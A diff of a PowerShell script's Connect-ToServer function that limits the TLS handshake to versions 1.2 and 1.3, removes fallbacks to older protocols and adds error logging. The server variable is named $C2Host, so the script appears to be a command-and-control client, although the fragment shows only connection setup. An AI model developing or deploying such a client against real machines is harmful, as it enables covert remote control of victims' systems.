@@ -181,33 +181,26 @@ function Connect-ToServer {
         $global:sslStream.ReadTimeout = 5000
         $global:sslStream.WriteTimeout = 10000
         
-        # Perform TLS handshake
+        # Perform TLS handshake - ONLY TLS 1.2/1.3, NO FALLBACKS
+        Write-Host "[*] Performing TLS handshake with server..." -ForegroundColor Yellow
+        Write-Host "[*] Target protocols: TLS 1.2 and TLS 1.3" -ForegroundColor Gray
+        Write-Host "[*] Server hostname: $C2Host" -ForegroundColor Gray
+        
         try {
-            Write-Host "[*] Performing TLS handshake with server..." -ForegroundColor Yellow
             $global:sslStream.AuthenticateAsClient(
                 $C2Host,
                 $null,
                 [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
                 $false
             )
+            Write-Host "[+] TLS handshake completed successfully" -ForegroundColor Green
         } catch {
-            Write-Host "[!] TLS 1.2/1.3 failed, trying TLS 1.1..." -ForegroundColor Yellow
-            try {
-                $global:sslStream.AuthenticateAsClient(
-                    $C2Host,
-                    $null,
-                    [System.Security.Authentication.SslProtocols]::Tls11,
-                    $false
-                )
-            } catch {
-                Write-Host "[!] TLS 1.1 failed, trying TLS 1.0..." -ForegroundColor Yellow
-                $global:sslStream.AuthenticateAsClient(
-                    $C2Host,
-                    $null,
-                    [System.Security.Authentication.SslProtocols]::Tls,
-                    $false
-                )
+            Write-Host "[!] TLS handshake failed with error: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "[!] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
+            if ($_.Exception.InnerException) {
+                Write-Host "[!] Inner exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
             }
+            throw "TLS handshake failed - cannot establish secure connection"
         }
         
         # Verify TLS connection
